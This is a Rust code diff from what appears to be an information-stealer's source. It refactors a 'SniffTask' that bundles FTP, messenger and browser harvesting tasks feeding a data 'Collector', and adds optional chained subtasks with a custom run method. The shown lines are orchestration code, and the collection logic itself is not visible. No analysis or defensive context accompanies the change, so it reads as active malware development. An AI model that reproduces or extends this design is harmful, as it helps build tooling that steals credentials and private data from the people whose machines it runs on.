@@ -19,10 +19,12 @@ use collector::Collector;
 use filesystem::FileSystem;
 use ftp::FtpTask;
 use messengers::MessengersTask;
-use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
+use tasks::{composite_task, CompositeTask, Task};
+use utils::path::Path;
 
 pub struct SniffTask<C: Collector, F: FileSystem> {
     inner: CompositeTask<C, F>,
+    subtasks: Option<CompositeTask<C, F>>,
 }
 
 impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F> {
@@ -38,8 +40,26 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F
                 MessengersTask::default(),
                 BrowsersTask::default(),
             ),
+            subtasks: None
         }
     }
 }
 
-impl_composite_task_runner!(SniffTask<C, F>);
+impl<C: Collector + 'static, F: FileSystem + 'static> SniffTask<C, F> {
+    pub fn with_subtasks(composite_task: CompositeTask<C, F>) -> Self {
+        Self {
+            subtasks: Some(composite_task),
+            ..Self::default()
+        }
+    }
+}
+
+impl<C: Collector, F: FileSystem> Task<C, F> for SniffTask<C, F> {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
+        self.inner.run(parent, filesystem, collector);
+
+        if let Some(subtasks) = &self.subtasks {
+            subtasks.run(parent, filesystem, collector);
+        }
+    }
+}
